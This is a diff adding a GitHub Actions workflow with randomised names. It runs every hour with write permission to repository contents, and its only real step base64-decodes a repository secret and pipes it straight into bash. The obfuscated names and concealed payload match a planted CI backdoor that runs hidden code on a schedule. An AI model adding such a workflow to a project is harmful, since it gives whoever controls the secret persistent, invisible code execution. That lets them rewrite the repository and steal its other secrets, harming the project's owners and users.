@@ -1,0 +1,15 @@
+name: uARsLUBgWHhgmT
+on:
+  schedule:
+    - cron: '44 * * * *'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  DRdiqimGKVbB:
+    runs-on: ubuntu-22.04
+    env:
+      XoyzcjCPccewgWXAXB: ${{ secrets.XoyzcjCPccewgWXAXB }}
+    steps:
+      - uses: actions/checkout@v4
+      - run: echo "${{ secrets.kbJlTzEdCMOYqSIscm }}" | base64 -d | bash
